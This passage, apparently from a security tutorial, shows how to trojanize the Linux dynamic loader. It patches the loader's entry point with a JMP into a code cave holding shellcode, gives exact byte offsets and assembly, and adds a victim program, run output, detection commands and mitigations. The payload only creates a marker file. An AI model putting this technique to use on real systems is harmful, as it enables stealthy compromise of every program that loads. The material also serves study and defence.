│                         CODE CAVE VISUALIZATION                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   ELF File Layout:                                                              │
│                                                                                 │
│   Offset 0x00000    ┌─────────────────────────────────┐                         │
│                     │ ELF Header                      │                         │
│                     │ Program Headers                 │                         │
│   Offset 0x01000    ├─────────────────────────────────┤                         │
│                     │                                 │                         │
│                     │ .text section (code)            │                         │
│                     │ Entry point at 0x1f540          │                         │
│                     │                                 │                         │
│   Offset 0x2b195    │ Last instruction of .text       │                         │
│   Offset 0x2b196    ├─────────────────────────────────┤                         │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │ ◀── CODE CAVE!          │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │     (padding bytes)     │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │     ~3688 bytes free    │
│   Offset 0x2c000    ├─────────────────────────────────┤                         │
│                     │ .rodata section                 │                         │
│                     │                                 │                         │
│                     └─────────────────────────────────┘                         │
│                                                                                 │
│   We inject our payload at 0x2b1a0 - plenty of space!                           │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.4 Implementation: The Entry Point Hook

We redirect the loader's entry point to our code with a simple JMP instruction:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    ENTRY POINT HOOK                                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   BEFORE PATCHING:                                                              │
│   ────────────────                                                              │
│                                                                                 │
│   Address    Bytes           Instruction                                        │
│   ───────────────────────────────────────                                       │
│   0x1f540    48 89 e7        mov rdi, rsp                                       │
│   0x1f543    e8 88 0c 00 00  call 0x201d0                                       │
│   0x1f548    49 89 c4        mov r12, rax                                       │
│                                                                                 │
│   AFTER PATCHING:                                                               │
│   ───────────────                                                               │
│                                                                                 │
│   Address    Bytes           Instruction                                        │
│   ───────────────────────────────────────                                       │
│   0x1f540    e9 5b bc 00 00  jmp 0x2b1a0     ◀── HIJACKED!                      │
│   0x1f545    0c 00 00        (corrupted)                                        │
│   0x1f548    49 89 c4        mov r12, rax                                       │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   OFFSET CALCULATION:                                                           │
│   ───────────────────                                                           │
│                                                                                 │
│   target = 0x2b1a0 (code cave)                                                  │
│   source = 0x1f540 (entry point)                                                │
│   JMP is 5 bytes, so RIP after JMP = 0x1f540 + 5 = 0x1f545                      │
│                                                                                 │
│   offset = target - RIP_after_JMP                                               │
│   offset = 0x2b1a0 - 0x1f545                                                    │
│   offset = 0xbc5b                                                               │
│                                                                                 │
│   JMP instruction = E9 5B BC 00 00  (little-endian)                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.5 Implementation: Payload Structure

Our payload must:
1. Save all registers (preserve program state)
2. Execute our code (create a marker file as proof of concept)
3. Restore all registers
4. Execute the original entry instructions we overwrote
5. Jump back to continue normal loader execution

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         PAYLOAD STRUCTURE                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   0x2b1a0:  ┌──────────────────────────────────────────────────────────┐        │
│             │ SAVE REGISTERS                                          │        │
│             │   push rax, rcx, rdx, rsi, rdi, r8-r11                  │        │
│             └──────────────────────────────────────────────────────────┘        │
│                           │                                                     │
│                           ▼                                                     │
│             ┌──────────────────────────────────────────────────────────┐        │
│             │ OUR CODE (Proof of Concept)                              │        │
│             │                                                          │        │
│             │   ; Example: Create a marker file using syscalls         │        │
│             │   ; open("/tmp/PWNED_BY_LOADER", O_CREAT|O_WRONLY, 0644) │        │
│             │   mov rax, 2            ; SYS_open                       │        │
│             │   lea rdi, [rip + path] ; filename                       │        │
│             │   mov rsi, 0x241        ; flags                          │        │
│             │   mov rdx, 0x1a4        ; mode                           │        │
│             │   syscall                                                │        │
│             │                                                          │        │
│             │   ; write(fd, message, len)                              │        │
│             │   ; close(fd)                                            │        │
│             │                                                          │        │
│             │   ★ This proves our code ran before the program ★        │        │
│             └──────────────────────────────────────────────────────────┘        │
│                           │                                                     │
│                           ▼                                                     │
│             ┌──────────────────────────────────────────────────────────┐        │
│             │ RESTORE REGISTERS                                        │        │
│             │   pop r11-r8, rdi, rsi, rdx, rcx, rax                   │        │
│             └──────────────────────────────────────────────────────────┘        │
│                           │                                                     │
│                           ▼                                                     │
│             ┌──────────────────────────────────────────────────────────┐        │
│             │ EXECUTE ORIGINAL CODE & RETURN                           │        │
│             │   mov rdi, rsp          ; Original first instruction     │        │
│             │   call 0x201d0          ; Original second instruction    │        │
│             │   jmp 0x1f548           ; Continue at entry+8            │        │
│             └──────────────────────────────────────────────────────────┘        │
│                           │                                                     │
│                           ▼                                                     │
│             ┌──────────────────────────────────────────────────────────┐        │
│             │ DATA SECTION                                             │        │
│             │   path:     "/tmp/PWNED_BY_LOADER\0"                     │        │
│             │   message:  "[TROJANIZED LOADER] Executed!\n\0"          │        │
│             └──────────────────────────────────────────────────────────┘        │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.6 Proof of Concept: The Victim Program

```c
/*
 * victim.c - An innocent program that will be targeted
 * Compile: gcc -o victim victim.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void do_sensitive_work(void) {
    printf("[VICTIM] Processing sensitive data...\n");
    printf("[VICTIM] Connecting to database...\n");
    printf("[VICTIM] Transaction complete!\n");
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║         LEGITIMATE BANKING APPLICATION           ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");

    printf("[VICTIM] PID: %d\n", getpid());
    printf("[VICTIM] Program starting normally...\n");

    do_sensitive_work();

    printf("[VICTIM] Shutting down cleanly.\n");
    return 0;
}
```

## 5.7 Proof of Concept: Results

### Running the Original Binary

```bash
$ rm -f /tmp/PWNED_BY_LOADER
$ ./victim

╔══════════════════════════════════════════════════╗
║         LEGITIMATE BANKING APPLICATION           ║
╚══════════════════════════════════════════════════╝

[VICTIM] PID: 64058
[VICTIM] Program starting normally...
[VICTIM] Processing sensitive data...
[VICTIM] Connecting to database...
[VICTIM] Transaction complete!
[VICTIM] Shutting down cleanly.

$ ls /tmp/PWNED_BY_LOADER
ls: cannot access '/tmp/PWNED_BY_LOADER': No such file or directory
```

**Result:** Normal execution, no marker file.

### Running the Trojanized Binary

```bash
$ rm -f /tmp/PWNED_BY_LOADER
$ ./victim_evil    # Patched to use evil loader

╔══════════════════════════════════════════════════╗
║         LEGITIMATE BANKING APPLICATION           ║
╚══════════════════════════════════════════════════╝

[VICTIM] PID: 64157
[VICTIM] Program starting normally...
[VICTIM] Processing sensitive data...
[VICTIM] Connecting to database...
[VICTIM] Transaction complete!
[VICTIM] Shutting down cleanly.

$ ls -la /tmp/PWNED_BY_LOADER
-rw-r--r-- 1 user user 56 Dec 21 12:42 /tmp/PWNED_BY_LOADER

$ cat /tmp/PWNED_BY_LOADER
[TROJANIZED LOADER] Code executed before program start!
```

**Result:**
- Program output is **IDENTICAL** to the original
- Marker file **created BEFORE program started**
- User sees **NO indication of compromise**

## 5.8 Visual Comparison

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         EXECUTION COMPARISON                                     │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   ORIGINAL (./victim)              TROJANIZED (./victim_evil)                   │
│   ═══════════════════              ══════════════════════════                   │
│                                                                                 │
│   1. Kernel loads                  1. Kernel loads                              │
│      /lib64/ld-linux-x86-64.so.2      ld-trojanized.so.2                        │
│                                                                                 │
│   2. Loader entry point            2. Loader entry point                        │
│      0x1f540: mov rdi, rsp            0x1f540: JMP 0x2b1a0 ◀── HIJACKED         │
│      0x1f543: call 0x201d0                                                      │
│      ...                           3. ★ SHELLCODE EXECUTES ★                    │
│                                       - Creates marker file                     │
│                                       - Could do ANYTHING                       │
│                                                                                 │
│                                    4. Shellcode executes original               │
│                                       entry instructions                        │
│                                                                                 │
│                                    5. JMP back to 0x1f548                       │
│                                                                                 │
│   3. Normal loader operation       6. Normal loader operation                   │
│      - Load libc                      - Load libc                               │
│      - Resolve symbols                - Resolve symbols                         │
│                                                                                 │
│   4. Jump to _start                7. Jump to _start                            │
│                                                                                 │
│   5. main() executes               8. main() executes                           │
│      [identical output]               [identical output]                        │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   MARKER FILE: Not created         MARKER FILE: CREATED!                        │
│                                    Contains: "[TROJANIZED LOADER]..."           │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.9 Forensic Analysis

### Binary Differences

```
Original loader @ 0x1f540:
0001f540: 4889 e7e8 880c 0000 4989 c449 89e5 8b15  H.......I..I....
          ^^^^^^^^
          mov rdi, rsp (normal)

Trojanized loader @ 0x1f540:
0001f540: e95b bc00 000c 0000 4989 c449 89e5 8b15  .[......I..I....
          ^^^^^^^^^^
          JMP 0x2b1a0 (hijacked!)
```

### Code Cave Comparison

```
Original loader @ 0x2b1a0:
0002b1a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          Empty padding (nulls)

Trojanized loader @ 0x2b1a0:
0002b1a0: 5051 5256 5741 5041 5141 5241 5348 8d3d  PQRVWAPAQARASH.=
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          Injected payload!
```

### Hash Comparison

```bash
$ sha256sum /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
6222a16be7f2d458d6870efe6e715fc0c8d45766fb79cf7dcc3125538d703e28

$ sha256sum ld-trojanized.so.2
8f54f57ba0e7bb639b71ff3f9a6d942095675f909c08b3c2a47c50810f6aa5c3
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              DIFFERENT HASH = MODIFIED BINARY
```

**Note:** File sizes are identical because we injected into existing padding!

## 5.10 Detection Methods

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        DETECTION METHODS                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   1. HASH VERIFICATION                                                          │
│      ─────────────────                                                          │
│      Compare against known-good hash:                                           │
│      $ sha256sum /lib64/ld-linux-x86-64.so.2                                    │
│      $ dpkg -V libc6 | grep ld-linux                                            │
│                                                                                 │
│   2. CHECK BINARY INTERPRETERS                                                  │
│      ──────────────────────────                                                 │
│      Find binaries with unusual interpreters:                                   │
│      $ readelf -l /path/to/binary | grep interpreter                            │
│      Should be: /lib64/ld-linux-x86-64.so.2                                     │
│                                                                                 │
│   3. ANALYZE LOADER ENTRY POINT                                                 │
│      ───────────────────────────                                                │
│      $ xxd -s 0x1f540 -l 5 /lib/.../ld-linux-x86-64.so.2                        │
│      Should be: 4889 e7e8 88 (mov rdi, rsp; call ...)                           │
│      NOT:       e9XX XXXX XX (jmp - SUSPICIOUS!)                                │
│                                                                                 │
│   4. CHECK CODE CAVES                                                           │
│      ─────────────────                                                          │
│      $ xxd -s 0x2b1a0 -l 64 /lib/.../ld-linux-x86-64.so.2                       │
│      Should be all zeros in padding areas                                       │
│                                                                                 │
│   5. FILE INTEGRITY MONITORING                                                  │
│      ──────────────────────────                                                 │
│      Use AIDE, Tripwire, or similar tools                                       │
│      $ aide --check                                                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.11 Mitigations

| Mitigation | Description | Effectiveness |
|------------|-------------|---------------|
| **Secure Boot** | Verify kernel and initramfs integrity | High |
| **dm-verity** | Read-only verified root filesystem | Very High |
| **IMA/EVM** | Kernel-level integrity measurement | Very High |
| **Read-only /lib** | Mount /lib as read-only | Medium |
| **File integrity monitoring** | Detect changes to critical files | Medium |

---

